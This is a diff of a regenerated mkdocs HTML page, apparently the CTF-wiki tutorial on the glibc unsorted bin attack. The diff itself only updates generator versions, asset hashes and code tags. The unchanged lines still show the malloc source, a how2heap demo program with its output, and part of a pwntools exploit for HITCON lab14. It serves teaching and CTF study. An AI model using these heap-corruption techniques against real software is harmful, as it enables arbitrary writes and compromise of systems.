@@ -38,7 +38,7 @@
         <meta name="lang:search.tokenizer" content="[\uff0c\u3002]+">
       
       <link rel="shortcut icon" href="../../../..">
-      <meta name="generator" content="mkdocs-1.0.4, mkdocs-material-4.6.0">
+      <meta name="generator" content="mkdocs-1.1, mkdocs-material-4.6.3">
     
     
       
@@ -46,9 +46,9 @@
       
     
     
-      <link rel="stylesheet" href="../../../../assets/stylesheets/application.e194128b.css">
+      <link rel="stylesheet" href="../../../../assets/stylesheets/application.adb8469c.css">
       
-        <link rel="stylesheet" href="../../../../assets/stylesheets/application-palette.3e3d1dff.css">
+        <link rel="stylesheet" href="../../../../assets/stylesheets/application-palette.a8b3c06d.css">
       
       
         
@@ -57,7 +57,7 @@
       
     
     
-      <script src="../../../../assets/javascripts/modernizr.74668098.js"></script>
+      <script src="../../../../assets/javascripts/modernizr.86422ebf.js"></script>
     
     
       
@@ -4663,16 +4663,16 @@
 </ol>
 <h2 id="_4">原理<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h2>
 <p>在  <a href="https://code.woboq.org/userspace/glibc/">glibc</a>/<a href="https://code.woboq.org/userspace/glibc/malloc/">malloc</a>/<a href="https://code.woboq.org/userspace/glibc/malloc/malloc.c.html">malloc.c</a> 中的 <code>_int_malloc</code> 有这么一段代码，当将一个 unsorted bin取出的时候，会将 <code>bck-&gt;fd</code> 的位置写入本 Unsorted Bin 的位置。</p>
-<div class="codehilite"><pre><span></span>          <span class="cm">/* remove from unsorted list */</span>
+<div class="codehilite"><pre><span></span><code>          <span class="cm">/* remove from unsorted list */</span>
           <span class="k">if</span> <span class="p">(</span><span class="n">__glibc_unlikely</span> <span class="p">(</span><span class="n">bck</span><span class="o">-&gt;</span><span class="n">fd</span> <span class="o">!=</span> <span class="n">victim</span><span class="p">))</span>
             <span class="n">malloc_printerr</span> <span class="p">(</span><span class="s">&quot;malloc(): corrupted unsorted chunks 3&quot;</span><span class="p">);</span>
           <span class="n">unsorted_chunks</span> <span class="p">(</span><span class="n">av</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">bk</span> <span class="o">=</span> <span class="n">bck</span><span class="p">;</span>
           <span class="n">bck</span><span class="o">-&gt;</span><span class="n">fd</span> <span class="o">=</span> <span class="n">unsorted_chunks</span> <span class="p">(</span><span class="n">av</span><span class="p">);</span>
-</pre></div>
+</code></pre></div>
 
 <p>换而言之，如果我们控制了 bk 的值，我们就能将 <code>unsorted_chunks (av)</code> 写到任意地址。</p>
 <p>这里我以 shellphish 的 how2heap 仓库中的 <a href="https://github.com/shellphish/how2heap/blob/master/unsorted_bin_attack.c">unsorted_bin_attack.c</a> 为例进行介绍，这里我做一些简单的修改，如下</p>
-<div class="codehilite"><pre><span></span><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
+<div class="codehilite"><pre><span></span><code><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
 <span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp"></span>
 
 <span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
@@ -4720,10 +4720,10 @@
                   <span class="s">&quot;rewrite:</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
   <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;%p: %p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">target_var</span><span class="p">,</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">target_var</span><span class="p">);</span>
 <span class="p">}</span>
-</pre></div>
+</code></pre></div>
 
 <p>程序执行后的效果为</p>
-<div class="codehilite"><pre><span></span>➜  unsorted_bin_attack git:<span class="o">(</span>master<span class="o">)</span> ✗ gcc unsorted_bin_attack.c -o unsorted_bin_attack
+<div class="codehilite"><pre><span></span><code>➜  unsorted_bin_attack git:<span class="o">(</span>master<span class="o">)</span> ✗ gcc unsorted_bin_attack.c -o unsorted_bin_attack
 ➜  unsorted_bin_attack git:<span class="o">(</span>master<span class="o">)</span> ✗ ./unsorted_bin_attack
 This file demonstrates unsorted bin attack by write a large unsigned long value into stack
 In practice, unsorted bin attack is generally prepared <span class="k">for</span> further attacks, such as rewriting the global variable global_max_fast in libc <span class="k">for</span> further fastbin attack
@@ -4740,7 +4740,7 @@ Let<span class="s1">&#39;s first look at the target we want to rewrite on stack:
 
 <span class="s1">Let&#39;</span>s malloc again to get the chunk we just free. During this time, target should has already been rewrite:
 0x7ffe0d232518: 0x7f1c705ffb78
-</pre></div>
+</code></pre></div>
 
 <p>这里我们可以使用一个图来描述一下具体发生的流程以及背后的原理。</p>
 <p><img alt="" src="../figure/unsorted_bin_attack_order.png" /></p>
@@ -4752,7 +4752,7 @@ Let<span class="s1">&#39;s first look at the target we want to rewrite on stack:
 <p>经过修改之后，原来在 unsorted bin 中的 p 的 bk 指针就会指向 target addr-16 处伪造的 chunk，即 Target Value 处于伪造 chunk 的 fd 处。</p>
 <p><strong>申请400大小的chunk</strong></p>
 <p>此时，所申请的 chunk 处于 small bin 所在的范围，其对应的 bin 中暂时没有 chunk，所以会去unsorted bin中找，发现 unsorted bin 不空，于是把 unsorted bin 中的最后一个 chunk 拿出来。</p>
-<div class="codehilite"><pre><span></span>        <span class="k">while</span> <span class="p">((</span><span class="n">victim</span> <span class="o">=</span> <span class="n">unsorted_chunks</span><span class="p">(</span><span class="n">av</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">bk</span><span class="p">)</span> <span class="o">!=</span> <span class="n">unsorted_chunks</span><span class="p">(</span><span class="n">av</span><span class="p">))</span> <span class="p">{</span>
+<div class="codehilite"><pre><span></span><code>        <span class="k">while</span> <span class="p">((</span><span class="n">victim</span> <span class="o">=</span> <span class="n">unsorted_chunks</span><span class="p">(</span><span class="n">av</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">bk</span><span class="p">)</span> <span class="o">!=</span> <span class="n">unsorted_chunks</span><span class="p">(</span><span class="n">av</span><span class="p">))</span> <span class="p">{</span>
             <span class="n">bck</span> <span class="o">=</span> <span class="n">victim</span><span class="o">-&gt;</span><span class="n">bk</span><span class="p">;</span>
             <span class="k">if</span> <span class="p">(</span><span class="n">__builtin_expect</span><span class="p">(</span><span class="n">chunksize_nomask</span><span class="p">(</span><span class="n">victim</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="mi">2</span> <span class="o">*</span> <span class="n">SIZE_SZ</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span> <span class="o">||</span>
                 <span class="n">__builtin_expect</span><span class="p">(</span><span class="n">chunksize_nomask</span><span class="p">(</span><span class="n">victim</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">av</span><span class="o">-&gt;</span><span class="n">system_mem</span><span class="p">,</span> <span class="mi">0</span><span class="p">))</span>
@@ -4777,7 +4777,7 @@ Let<span class="s1">&#39;s first look at the target we want to rewrite on stack:
             <span class="cm">/* remove from unsorted list */</span>
             <span class="n">unsorted_chunks</span><span class="p">(</span><span class="n">av</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">bk</span> <span class="o">=</span> <span class="n">bck</span><span class="p">;</span>
             <span class="n">bck</span><span class="o">-&gt;</span><span class="n">fd</span>                 <span class="o">=</span> <span class="n">unsorted_chunks</span><span class="p">(</span><span class="n">av</span><span class="p">);</span>
-</pre></div>
+</code></pre></div>
 
 <ul>
 <li>victim = unsorted_chunks(av)-&gt;bk=p</li>
@@ -4787,13 +4787,13 @@ Let<span class="s1">&#39;s first look at the target we want to rewrite on stack:
 </ul>
 <p><strong>可以看出，在将 unsorted bin 的最后一个 chunk 拿出来的过程中，victim 的 fd 并没有发挥作用，所以即使我们修改了其为一个不合法的值也没有关系。</strong>然而，需要注意的是，unsorted bin 链表可能就此破坏，在插入 chunk 时，可能会出现问题。</p>
 <p>即修改 target 处的值为 unsorted bin 的链表头部 0x7f1c705ffb78，也就是之前输出的信息。</p>
-<div class="codehilite"><pre><span></span>We free the first chunk now and it will be inserted in the unsorted bin with its bk pointer point to 0x7f1c705ffb78
+<div class="codehilite"><pre><span></span><code>We free the first chunk now and it will be inserted in the unsorted bin with its bk pointer point to 0x7f1c705ffb78
 Now emulating a vulnerability that can overwrite the victim-&gt;bk pointer
 And we write it with the target address-16 <span class="o">(</span>in <span class="m">32</span>-bits machine, it should be target address-8<span class="o">)</span>:0x7ffe0d232508
 
 Let<span class="err">&#39;</span>s malloc again to get the chunk we just free. During this time, target should has already been rewrite:
 0x7ffe0d232518: 0x7f1c705ffb78
-</pre></div>
+</code></pre></div>
 
 <p>这里我们可以看到 unsorted bin attack 确实可以修改任意地址的值，但是所修改成的值却不受我们控制，唯一可以知道的是，这个值比较大。<strong>而且，需要注意的是，</strong></p>
 <p>这看起来似乎并没有什么用处，但是其实还是有点卵用的，比如说</p>
@@ -4804,11 +4804,11 @@ Let<span class="err">&#39;</span>s malloc again to get the chunk we just free. D
 <h2 id="hitcon-training-lab14-magic-heap">HITCON Training lab14 magic heap<a class="headerlink" href="#hitcon-training-lab14-magic-heap" title="Permanent link">&para;</a></h2>
 <p><a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/unsorted_bin_attack/hitcontraining_lab14">题目链接</a></p>
 <p>这里我们修改一下源程序中的 l33t 函数，以便于可以正常运行。</p>
-<div class="codehilite"><pre><span></span><span class="kt">void</span> <span class="nf">l33t</span><span class="p">()</span> <span class="p">{</span> <span class="n">system</span><span class="p">(</span><span class="s">&quot;cat ./flag&quot;</span><span class="p">);</span> <span class="p">}</span>
-</pre></div>
+<div class="codehilite"><pre><span></span><code><span class="kt">void</span> <span class="nf">l33t</span><span class="p">()</span> <span class="p">{</span> <span class="n">system</span><span class="p">(</span><span class="s">&quot;cat ./flag&quot;</span><span class="p">);</span> <span class="p">}</span>
+</code></pre></div>
 
 <h3 id="_5">基本信息<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h3>
-<div class="codehilite"><pre><span></span>➜  hitcontraining_lab14 git:<span class="o">(</span>master<span class="o">)</span> file magicheap
+<div class="codehilite"><pre><span></span><code>➜  hitcontraining_lab14 git:<span class="o">(</span>master<span class="o">)</span> file magicheap
 magicheap: ELF <span class="m">64</span>-bit LSB executable, x86-64, version <span class="m">1</span> <span class="o">(</span>SYSV<span class="o">)</span>, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, <span class="k">for</span> GNU/Linux <span class="m">2</span>.6.32, BuildID<span class="o">[</span>sha1<span class="o">]=</span>9f84548d48f7baa37b9217796c2ced6e6281bb6f, not stripped
 ➜  hitcontraining_lab14 git:<span class="o">(</span>master<span class="o">)</span> checksec magicheap
 <span class="o">[</span>*<span class="o">]</span> <span class="s1">&#39;/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/unsorted_bin_attack/hitcontraining_lab14/magicheap&#39;</span>
@@ -4817,7 +4817,7 @@ magicheap: ELF <span class="m">64</span>-bit LSB executable, x86-64, version <sp
     Stack:    Canary found
     NX:       NX enabled
     PIE:      No PIE <span class="o">(</span>0x400000<span class="o">)</span>
-</pre></div>
+</code></pre></div>
 
 <p>可以看出，该程序是一个动态链接的64程序，主要开启了 NX 保护与 Canary 保护。</p>
 <h3 id="_6">基本功能<a class="headerlink" href="#_6" title="Permanent link">&para;</a></h3>
@@ -4836,7 +4836,7 @@ magicheap: ELF <span class="m">64</span>-bit LSB executable, x86-64, version <sp
 <li>触发漏洞即可。</li>
 </ol>
 <p>代码如下</p>
-<div class="codehilite"><pre><span></span><span class="ch">#!/usr/bin/env python</span>
+<div class="codehilite"><pre><span></span><code><span class="ch">#!/usr/bin/env python</span>
 <span class="c1"># -*- coding: utf-8 -*-</span>
 <span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 
@@ -4886,7 +4886,7 @@ magicheap: ELF <span class="m">64</span>-bit LSB executable, x86-64, version <sp
 <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;:&quot;</span><span class="p">)</span>
 <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&quot;4869&quot;</span><span class="p">)</span>
 <span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
-</pre></div>
+</code></pre></div>
 
 <h2 id="2016-0ctf-zerostorage-">2016 0CTF zerostorage-待完成<a class="headerlink" href="#2016-0ctf-zerostorage-" title="Permanent link">&para;</a></h2>
 <p><strong>注：待进一步完成。</strong></p>
@@ -4894,7 +4894,7 @@ magicheap: ELF <span class="m">64</span>-bit LSB executable, x86-64, version <sp
 <p><strong>这个题当时给了服务器的系统版本和内核版本，所以自己可以下一个一模一样的进行调试，这里我们就直接用自己的本地机器调试了。但是在目前的Ubuntu 16.04 中，由于进一步的随机化，导致 libc 加载的位置与程序模块加载的位置之间的相对偏移不再固定，所以 BrieflyX 的策略就无法再次使用，似乎只能用 angelboy 的策略了。</strong></p>
 <h3 id="_8">安全性检查<a class="headerlink" href="#_8" title="Permanent link">&para;</a></h3>
 <p>可以看出，该程序开启了所有的保护</p>
-<div class="codehilite"><pre><span></span>pwndbg&gt; checksec
+<div class="codehilite"><pre><span></span><code>pwndbg&gt; checksec
 <span class="o">[</span>*<span class="o">]</span> <span class="s1">&#39;/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/unsorted_bin_attack/zerostorage/zerostorage&#39;</span>
     Arch:     amd64-64-little
     RELRO:    Full RELRO
@@ -4902,17 +4902,17 @@ magicheap: ELF <span class="m">64</span>-bit LSB executable, x86-64, version <sp
     NX:       NX enabled
     PIE:      PIE enabled
     FORTIFY:  Enabled
-</pre></div>
+</code></pre></div>
 
 <h3 id="_9">基本功能分析<a class="headerlink" href="#_9" title="Permanent link">&para;</a></h3>
 <p>程序管理在 bss 段的存储空间 storage ，具有插入，删除，合并，删除，查看，枚举，退出功能。这个storage的结构体如下</p>
-<div class="codehilite"><pre><span></span>00000000 Storage         struc ; (sizeof=0x18, mappedto_7)
+<div class="codehilite"><pre><span></span><code>00000000 Storage         struc ; (sizeof=0x18, mappedto_7)
 00000000                                         ; XREF: .bss:storage_list/r
 00000000 use             dq ?
 00000008 size            dq ?
 00000010 xor_addr        dq ?
 00000018 Storage         ends
-</pre></div>
+</code></pre></div>
 
 <h4 id="insert-1">insert-1<a class="headerlink" href="#insert-1" title="Permanent link">&para;</a></h4>
 <p>基本功能如下</p>
@@ -5096,7 +5096,7 @@ magicheap: ELF <span class="m">64</span>-bit LSB executable, x86-64, version <sp
       
     </div>
     
-      <script src="../../../../assets/javascripts/application.970603a6.js"></script>
+      <script src="../../../../assets/javascripts/application.df00da5d.js"></script>
       
         
         
@@ -5111,7 +5111,7 @@ magicheap: ELF <span class="m">64</span>-bit LSB executable, x86-64, version <sp
           
         
       
-      <script>app.initialize({version:"1.0.4",url:{base:"../../../.."}})</script>
+      <script>app.initialize({version:"1.1",url:{base:"../../../.."}})</script>
       
         <script src="https://cdnjs.loli.net/ajax/libs/pangu/3.3.0/pangu.min.js"></script>
       
